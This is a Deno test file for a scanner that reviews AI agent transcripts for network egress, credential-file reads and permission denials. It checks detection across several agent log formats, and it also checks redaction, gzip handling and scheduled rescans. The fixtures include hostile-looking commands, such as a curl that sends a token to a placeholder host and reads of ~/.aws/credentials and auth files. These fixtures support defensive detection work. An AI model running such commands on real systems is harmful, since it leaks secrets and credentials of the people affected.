import { assertEquals, assertStringIncludes } from "@std/assert";
import {
  createScheduledTranscriptScan,
  scanAgentTranscripts,
} from "../lib/agent_transcript_scan.ts";

const tool = (name: string, input: unknown) =>
  JSON.stringify({
    type: "assistant",
    message: { content: [{ type: "tool_use", name, input }] },
  });
Deno.test("scan flags actual tool attempts and credential reads, but ignores clean text and redacts findings", async () => {
  const dir = await Deno.makeTempDir();
  try {
    await Deno.writeTextFile(
      `${dir}/agent-vibe-fixture.jsonl`,
      [
        tool("Bash", {
          command: "curl https://example.invalid/?token=private-value",
        }),
        tool("Read", { file_path: "/home/worker/.aws/credentials" }),
        JSON.stringify({
          type: "result",
          permission_denials: [{
            tool_name: "Bash",
            tool_input: { command: "secret-command" },
          }],
        }),
        JSON.stringify({
          type: "assistant",
          message: {
            content: [{
              type: "text",
              text: "Do not curl https://example.invalid",
            }],
          },
        }),
      ].join("\n"),
    );
    await Deno.writeTextFile(
      `${dir}/agent-vibe-clean.jsonl`,
      tool("Read", { file_path: "src/app.ts" }),
    );
    const result = await scanAgentTranscripts(dir);
    assertEquals(result.findings.map((f) => f.signal), [
      "egress-attempt",
      "credential-path",
      "disallowed-tool",
    ]);
    assertEquals(result.scanned, 2);
    assertEquals(result.malformedLines, 0);
    assertEquals(JSON.stringify(result).includes("private-value"), false);
    assertEquals(JSON.stringify(result).includes("secret-command"), false);
  } finally {
    await Deno.remove(dir, { recursive: true });
  }
});

Deno.test("scheduled scan emits operator findings once per changed file and survives restart", async () => {
  const dir = await Deno.makeTempDir();
  const logs: string[] = [];
  let now = 100;
  try {
    const path = `${dir}/agent-vibe-run.jsonl`;
    await Deno.writeTextFile(
      path,
      tool("WebFetch", { url: "https://example.invalid" }),
    );
    const options = {
      logDir: dir,
      warn: (s: string) => logs.push(s),
      info: (s: string) => logs.push(s),
      now: () => now,
    };
    await createScheduledTranscriptScan(options)();
    assertStringIncludes(logs.join("\n"), "AGENT_TRANSCRIPT_SIGNAL");
    assertStringIncludes(logs.join("\n"), "agent-vibe-run.jsonl:1");
    assertEquals(logs.some((line) => line.includes("state unreadable")), false);
    const count = logs.length;
    await createScheduledTranscriptScan(options)();
    assertEquals(logs.length, count);
    now += 6 * 3600_000;
    await createScheduledTranscriptScan(options)();
    assertEquals(
      logs.filter((s) => s.includes("AGENT_TRANSCRIPT_SIGNAL")).length,
      1,
    );
    await Deno.writeTextFile(
      path,
      tool("Read", { file_path: "/home/x/.config/gh/hosts.yml" }),
      { append: true },
    );
    now += 6 * 3600_000;
    await createScheduledTranscriptScan(options)();
    assertStringIncludes(logs.join("\n"), "malformed_lines=1");
  } finally {
    await Deno.remove(dir, { recursive: true });
  }
});

Deno.test("scan reads retained gzip and rotation files, skips symlinks, and reports malformed lines", async () => {
  const dir = await Deno.makeTempDir();
  try {
    const input = new Blob([
      tool("Bash", { command: "cat ~/.codex/auth.json" }) + "\nnot json\n",
    ]);
    const gz = new Uint8Array(
      await new Response(
        input.stream().pipeThrough(new CompressionStream("gzip")),
      ).arrayBuffer(),
    );
    await Deno.writeFile(`${dir}/agent-vibe-rotation.jsonl.1.gz`, gz);
    await Deno.symlink(
      `${dir}/agent-vibe-rotation.jsonl.1.gz`,
      `${dir}/agent-vibe-link.jsonl.gz`,
    );
    const result = await scanAgentTranscripts(dir);
    assertEquals(result.findings.map((f) => f.signal), ["credential-path"]);
    assertEquals(result.scanned, 1);
    assertEquals(result.malformedLines, 1);
    assertEquals(
      result.fingerprints["agent-vibe-rotation.jsonl.1.gz"],
      undefined,
    );
  } finally {
    await Deno.remove(dir, { recursive: true });
  }
});

Deno.test("unreadable compressed transcript does not hide other findings or mark coverage complete", async () => {
  const dir = await Deno.makeTempDir();
  const logs: string[] = [];
  try {
    await Deno.writeTextFile(
      `${dir}/agent-vibe-a-invalid.jsonl.gz`,
      "not gzip",
    );
    await Deno.writeTextFile(
      `${dir}/agent-vibe-b-valid.jsonl`,
      tool("WebFetch", { url: "https://example.invalid" }),
    );
    await createScheduledTranscriptScan({
      logDir: dir,
      warn: (s) => logs.push(s),
      info: (s) => logs.push(s),
    })();
    assertStringIncludes(logs.join("\n"), "AGENT_TRANSCRIPT_SIGNAL");
    assertStringIncludes(logs.join("\n"), "failed_files=1");
    const state = JSON.parse(
      await Deno.readTextFile(`${dir}/.agent-transcript-scan-v1.json`),
    );
    assertEquals(
      state.fingerprints["agent-vibe-a-invalid.jsonl.gz"],
      undefined,
    );
  } finally {
    await Deno.remove(dir, { recursive: true });
  }
});

Deno.test("native Codex and Gemini streams expose egress, credential paths and permission denials", async () => {
  const dir = await Deno.makeTempDir();
  try {
    // Schema fixtures from openai/codex sdk/typescript/src/items.ts and
    // google-gemini/gemini-cli packages/core/src/output/types.ts.
    const events = [
      {
        type: "item.started",
        item: {
          type: "command_execution",
          command: "/bin/zsh -lc 'curl https://example.invalid'",
        },
      },
      {
        type: "item.completed",
        item: {
          type: "command_execution",
          command: "cat ~/.config/gh/hosts.yml",
          status: "completed",
        },
      },
      {
        type: "tool_use",
        tool_name: "run_shell_command",
        parameters: { command: "wget https://example.invalid" },
      },
      {
        type: "tool_use",
        tool_name: "read_file",
        parameters: { file_path: "/home/vibe/.codex/auth.json" },
      },
      {
        type: "tool_result",
        status: "error",
        error: { type: "permission_denied", message: "Permission denied" },
      },
      {
        type: "message",
        role: "assistant",
        content: "Please do not curl any address.",
      },
    ];
    await Deno.writeTextFile(
      `${dir}/agent-vibe-native.jsonl`,
      events.map((event) => JSON.stringify(event)).join("\n"),
    );
    const result = await scanAgentTranscripts(dir);
    assertEquals(result.findings.map((f) => f.signal), [
      "egress-attempt",
      "credential-path",
      "disallowed-tool",
    ]);
    assertEquals(result.findings.map((f) => f.occurrences), [2, 2, 1]);
  } finally {
    await Deno.remove(dir, { recursive: true });
  }
});

Deno.test("oversized transcript is retried and does not hide other files", async () => {
  const dir = await Deno.makeTempDir();
  try {
    await Deno.writeTextFile(
      `${dir}/agent-vibe-a-large.jsonl`,
      "x".repeat(200),
    );
    await Deno.writeTextFile(`${dir}/agent-vibe-b-clean.jsonl`, "{}");
    const result = await scanAgentTranscripts(dir, {}, 100);
    assertEquals(result.failedFiles, ["agent-vibe-a-large.jsonl"]);
    assertEquals(result.scanned, 1);
    assertEquals(result.fingerprints["agent-vibe-a-large.jsonl"], undefined);
  } finally {
    await Deno.remove(dir, { recursive: true });
  }
});

Deno.test("scanner distinguishes permission signals from clean and malformed event shapes", async () => {
  const dir = await Deno.makeTempDir();
  try {
    const events = [
      null,
      [],
      "text",
      {},
      { type: "result", permission_denials: [] },
      { type: "result", permission_denials: "not an array" },
      {
        type: "assistant",
        message: {
          content: [
            {
              type: "tool_use",
              name: "Bash",
              input: { command: "git status" },
            },
            { type: "tool_use", name: "Read", input: {} },
            { type: "tool_use", name: "Other", input: null },
          ],
        },
      },
      {
        type: "assistant",
        message: {
          content: [{ type: "tool_use", name: "EnterPlanMode" }, {
            type: "tool_use",
            name: "ExitPlanMode",
          }],
        },
      },
      {
        type: "user",
        message: {
          content: [{
            type: "tool_result",
            is_error: true,
            content: "Permission denied",
          }, {
            type: "tool_result",
            is_error: false,
            content: "Permission denied",
          }, {
            type: "tool_result",
            is_error: true,
            content: "ordinary failure",
          }, { type: "tool_result", is_error: true, content: [] }],
        },
      },
      { type: "item.completed", item: { type: "agent_message", text: "curl" } },
      {
        type: "item.started",
        item: { type: "command_execution", command: null },
      },
      { type: "tool_use", tool_name: "web_fetch", parameters: {} },
      { type: "tool_use", tool_name: "google_web_search", parameters: {} },
      {
        type: "tool_use",
        tool_name: "read_file",
        parameters: { file_path: "src/main.ts" },
      },
      { type: "tool_use", tool_name: "read_file", parameters: {} },
      {
        type: "tool_use",
        tool_name: "run_shell_command",
        parameters: { command: "cat ~/.aws/credentials" },
      },
      { type: "tool_use", tool_name: "run_shell_command", parameters: {} },
      {
        type: "tool_result",
        status: "success",
        error: { type: "permission_denied" },
      },
      {
        type: "tool_result",
        status: "error",
        error: { type: "ordinary_failure" },
      },
      { type: "tool_result", status: "error" },
    ];
    await Deno.writeTextFile(
      `${dir}/agent-vibe-shapes.jsonl`,
      "\n" + events.map((event) => JSON.stringify(event)).join("\n") + "\n",
    );
    await Deno.writeTextFile(`${dir}/unrelated.jsonl`, tool("WebFetch", {}));
    await Deno.mkdir(`${dir}/agent-vibe-directory.jsonl`);
    const result = await scanAgentTranscripts(dir);
    assertEquals(result.scanned, 1);
    assertEquals(result.malformedLines, 0);
    assertEquals(result.findings.map((f) => [f.signal, f.occurrences]), [
      ["disallowed-tool", 2],
      ["egress-attempt", 2],
      ["credential-path", 1],
    ]);
  } finally {
    await Deno.remove(dir, { recursive: true });
  }
});

Deno.test("scheduled scan repairs invalid state, handles future clocks, and serialises concurrent hooks", async () => {
  const dir = await Deno.makeTempDir();
  try {
    await Deno.writeTextFile(
      `${dir}/agent-vibe-valid.jsonl`,
      tool("WebFetch", {}),
    );
    const path = `${dir}/.agent-transcript-scan-v1.json`;
    for (
      const state of [
        "not json",
        JSON.stringify({ lastScan: "bad", fingerprints: {} }),
        JSON.stringify({ lastScan: 0, fingerprints: [] }),
        JSON.stringify({ lastScan: 0, fingerprints: { bad: 42 } }),
      ]
    ) {
      await Deno.writeTextFile(path, state);
      const warnings: string[] = [];
      const scan = createScheduledTranscriptScan({
        logDir: dir,
        now: () => 100,
        warn: (s) => warnings.push(s),
        info: () => {},
      });
      await Promise.all([scan(), scan()]);
      assertEquals(
        warnings.filter((s) => s.includes("state unreadable")).length,
        1,
      );
      assertEquals(
        warnings.filter((s) => s.includes("AGENT_TRANSCRIPT_SIGNAL")).length,
        1,
      );
    }
    await Deno.writeTextFile(
      path,
      JSON.stringify({ lastScan: 1000, fingerprints: {} }),
    );
    const logs: string[] = [];
    await createScheduledTranscriptScan({
      logDir: dir,
      now: () => 100,
      warn: (s) => logs.push(s),
      info: (s) => logs.push(s),
    })();
    assertStringIncludes(logs.join("\n"), "AGENT_TRANSCRIPT_SIGNAL");
  } finally {
    await Deno.remove(dir, { recursive: true });
  }
});

Deno.test("missing directory is empty, while inaccessible scan location warns and can recover", async () => {
  const dir = await Deno.makeTempDir();
  const logs: string[] = [];
  try {
    assertEquals((await scanAgentTranscripts(`${dir}/missing`)).scanned, 0);
    const path = `${dir}/logs`;
    await Deno.writeTextFile(path, "not a directory");
    const scan = createScheduledTranscriptScan({
      logDir: path,
      warn: (s) => logs.push(s),
      info: (s) => logs.push(s),
    });
    await scan();
    assertStringIncludes(logs.join("\n"), "scan failed");
    await Deno.remove(path);
    await scan();
    assertStringIncludes(logs.join("\n"), "scanned=0 findings=0");
  } finally {
    await Deno.remove(dir, { recursive: true });
  }
});

Deno.test("scanner gates every provider signal on its native event and executable field", async () => {
  const dir = await Deno.makeTempDir();
  const bash = {
    type: "tool_use",
    name: "Bash",
    input: { command: "curl ~/.aws/credentials" },
  };
  const denial = {
    type: "tool_result",
    is_error: true,
    content: "Permission denied",
  };
  const command = {
    type: "command_execution",
    command: "curl ~/.aws/credentials",
  };
  const cases: [unknown, string[]][] = [
    [{ type: "other", permission_denials: [1] }, []],
    [{
      type: "user",
      message: { content: [{ ...denial, content: "ordinary failure" }] },
    }, []],
    [
      { type: "user", message: { content: [{ ...denial, is_error: false }] } },
      [],
    ],
    [{
      type: "item.completed",
      item: { ...command, command: ["curl", "~/.aws/credentials"] },
    }, []],
    [{
      type: "tool_use",
      tool_name: "run_shell_command",
      parameters: { command: ["curl", "~/.aws/credentials"] },
    }, []],
    [{
      type: "tool_use",
      tool_name: "read_file",
      parameters: { file_path: ["~/.aws/credentials"] },
    }, []],
    [{
      type: "assistant",
      message: {
        content: [{
          ...bash,
          input: { command: ["curl", "~/.aws/credentials"] },
        }],
      },
    }, []],
    [{
      type: "assistant",
      message: {
        content: [{
          type: "tool_use",
          name: "Read",
          input: { file_path: ["~/.aws/credentials"] },
        }],
      },
    }, []],
    [{
      type: "user",
      message: { content: [{ ...denial, content: ["Permission denied"] }] },
    }, []],
    [{ type: "result", permission_denials: { length: 1 } }, []],
    [{ type: "other", item: command }, []],
    [{ type: "item.started", item: { ...command, type: "text" } }, []],
    [
      { type: "item.completed", item: { ...command, command: "git status" } },
      [],
    ],
    [{ type: "other", tool_name: "web_fetch" }, []],
    [{
      type: "tool_use",
      tool_name: "other",
      parameters: { command: command.command, file_path: "~/.aws/credentials" },
    }, []],
    [{
      type: "tool_use",
      tool_name: "run_shell_command",
      parameters: { command: "git status" },
    }, []],
    [{
      type: "tool_use",
      tool_name: "read_file",
      parameters: { file_path: 123 },
    }, []],
    [
      { type: "other", status: "error", error: { type: "permission_denied" } },
      [],
    ],
    [{ type: "other", message: { content: [bash, denial] } }, []],
    [{ type: "assistant", message: { content: { length: 1 } } }, []],
    [{ type: "user", message: { content: { length: 1 } } }, []],
    [
      { type: "assistant", message: { content: [{ ...bash, type: "text" }] } },
      [],
    ],
    [
      { type: "assistant", message: { content: [{ ...bash, name: "Other" }] } },
      [],
    ],
    [{
      type: "assistant",
      message: {
        content: [{
          type: "tool_use",
          name: "Other",
          input: { file_path: "~/.aws/credentials" },
        }],
      },
    }, []],
    [{ type: "user", message: { content: [{ ...denial, type: "text" }] } }, []],
    [{
      type: "assistant",
      message: { content: [{ type: "tool_use", name: "EnterPlanMode" }] },
    }, ["disallowed-tool"]],
    [{
      type: "assistant",
      message: { content: [{ type: "tool_use", name: "ExitPlanMode" }] },
    }, ["disallowed-tool"]],
    [{ type: "item.started", item: command }, [
      "egress-attempt",
      "credential-path",
    ]],
    [{ type: "item.completed", item: command }, [
      "egress-attempt",
      "credential-path",
    ]],
  ];
  try {
    for (const [event, expected] of cases) {
      await Deno.writeTextFile(
        `${dir}/agent-vibe-one.jsonl`,
        JSON.stringify(event),
      );
      const result = await scanAgentTranscripts(dir);
      assertEquals(result.scanned, 1, JSON.stringify(event));
      assertEquals(
        result.findings.map((f) => f.signal),
        expected,
        JSON.stringify(event),
      );
    }
  } finally {
    await Deno.remove(dir, { recursive: true });
  }
});

Deno.test("scheduled scan warns separately for incomplete files and scrubs unexpected thrown values", async () => {
  const dir = await Deno.makeTempDir();
  try {
    for (
      const [name, content, expected] of [
        ["agent-vibe-failed.jsonl.gz", "not gzip", "failed_files=1"],
        ["agent-vibe-malformed.jsonl", "not json", "malformed_lines=1"],
      ] as const
    ) {
      const warnings: string[] = [];
      const infos: string[] = [];
      await Deno.writeTextFile(`${dir}/${name}`, content);
      await createScheduledTranscriptScan({
        logDir: dir,
        warn: (s) => warnings.push(s),
        info: (s) => infos.push(s),
      })();
      assertEquals(
        warnings.some((line) =>
          line.includes("scanned=") && line.includes(expected)
        ),
        true,
      );
      assertEquals(infos.length, 0);
      await Deno.remove(`${dir}/${name}`);
      await Deno.remove(`${dir}/.agent-transcript-scan-v1.json`);
    }
    const warnings: string[] = [];
    await createScheduledTranscriptScan({
      logDir: dir,
      warn: (s) => warnings.push(s),
      info: () => {
        const unexpected: unknown = "untrusted-secret";
        throw unexpected;
      },
    })();
    assertEquals(warnings, [
      "[agent-transcript-scan] scan failed (unknown error); retained evidence was not marked scanned",
    ]);
  } finally {
    await Deno.remove(dir, { recursive: true });
  }
});
